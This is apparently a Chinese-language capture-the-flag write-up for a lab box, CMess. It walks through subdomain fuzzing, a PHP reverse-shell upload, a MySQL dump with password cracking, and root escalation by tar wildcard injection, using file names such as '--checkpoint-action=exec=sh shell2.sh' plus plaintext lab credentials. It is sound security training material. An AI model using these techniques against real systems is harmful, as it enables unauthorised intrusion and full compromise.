# Recon

- nmap 

![image](https://hackmd.io/_uploads/SJoAWsJE6.png)

- gobuster

![image](https://hackmd.io/_uploads/ryeDIfo1ET.png)

發現有/admin，打開是登入點，試一下找不到SQLi，嘗試子網域模糊測試

- wfuzz
    - `wfuzz -c -w ~/subdomains-top1million-5000.txt -u http://cmess.thm -H "Host: FUZZ.cmess.thm"`
    - ![image](https://hackmd.io/_uploads/HJDZMsZNp.png)
    - 發現有大量290，這是主頁的數字，我們不需要，所以想辦法過濾掉
    - `wfuzz -c -w ~/subdomains-top1million-5000.txt -u http://cmess.thm -H "Host: FUZZ.cmess.thm" --hw 290`
    - ![image](https://hackmd.io/_uploads/HJhTmi-4T.png)
    - ![image](https://hackmd.io/_uploads/BJXbHibV6.png)
    - 可以發現帳密了
        - user: andre@cmess.thm
        - passwd: KPFTN_f2yxe%

- ![image](https://hackmd.io/_uploads/SkcFrib4p.png)

# initial

- 開始瀏覽後台
    - 有上傳點
    - ![image](https://hackmd.io/_uploads/rkbQUsZ4p.png)
    - 丟php-reverse-shell後啟動nc直接等回連
    - ![image](https://hackmd.io/_uploads/ByAJ3o-Na.png)
    - 在/var/www/html 找到config.php
        - ![image](https://hackmd.io/_uploads/H13pRoWVT.png)
    - 確定有資料庫，研判應該是mysql，並且知道帳密
        - `mysqldump -u root -p r0otus3rpassw0rd --all-databases > all_databases.sql`
        - ![image](https://hackmd.io/_uploads/ByVV_Jz4a.png)
        - 用john去爆破他

    - ![image](https://hackmd.io/_uploads/Sy8vtJfEa.png)
    - 用ssh登入
    - 進去後取的user.txt flag

# PrivESC

- 直接上linpeas
    - 從本地端下載後，開啟http.server，在shell端用wget下載，記得chmod +x
    - 跑完發現crontab有點怪怪的
        - ![image](https://hackmd.io/_uploads/rJeITkzV6.png)
        - 看來它使用了* 導致可以使用tar進行shell，而且權限是root
        - ![image](https://hackmd.io/_uploads/SyGXLeGET.png)

- reverse shell
    - 首先，在/backup 底下創立一個shell.sh
    - 然後很白癡的，用bash建立反連，但這很爛!!! 不要用
        - ![image](https://hackmd.io/_uploads/rkAcIxf4a.png)
    - 直接用nc 做反連
        - ![image](https://hackmd.io/_uploads/Sy3pLxGN6.png)
        - 接下來設定chechpoint跟執行動作
            - `touch /home/andre/backup/--checkpoint=1`
            - `touch /home/andre/backup/--checkpoint-action=exec=sh\ shell2.sh`
        - 在攻擊端啟動nc監聽
            - ![image](https://hackmd.io/_uploads/Hyb6PxzN6.png)
  







